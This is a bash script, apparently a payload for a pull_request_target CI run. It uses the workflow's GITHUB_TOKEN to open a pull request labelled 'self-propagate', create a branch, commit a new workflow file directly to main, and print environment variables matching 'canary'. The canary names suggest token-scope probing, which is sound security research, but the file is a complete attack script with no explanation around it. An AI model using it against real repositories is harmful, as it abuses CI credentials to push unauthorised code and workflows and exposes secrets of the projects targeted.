#!/bin/bash
echo "PR_TARGET_EXEC $(id)"
echo "=== PR-TARGET TOKEN: attempt POST /pulls (self-propagate) ==="
curl -s -o /tmp/p.json -w "PRT_PULLS_HTTP=%{http_code}\n" -X POST \
  -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/$GITHUB_REPOSITORY/pulls \
  -d '{"title":"i10290 selftest pr","head":"i10290-botpr-demo","base":"main"}'
cat /tmp/p.json; echo
echo "=== PR-TARGET TOKEN: create ref ==="
curl -s -o /tmp/r.json -w "PRT_REF_HTTP=%{http_code}\n" -X POST \
  -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs \
  -d '{"ref":"refs/heads/i10290-prt-'"$$"'","sha":"'"$(git rev-parse HEAD)"'"}'
cat /tmp/r.json; echo
echo "=== PR-TARGET TOKEN: can it write workflow file? ==="
curl -s -o /tmp/w.json -w "PRT_WF_HTTP=%{http_code}\n" -X PUT \
  -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/i10290-wf-probe.yml \
  -d '{"message":"wf probe","content":"bmFtZTogcHJvYmUKb246IHdvcmtmbG93X2Rpc3BhdGNoCmpvYnM6Cnt9Cg==","branch":"main"}'
cat /tmp/w.json; echo
echo "=== env secrets visible ==="
env | grep -i canary
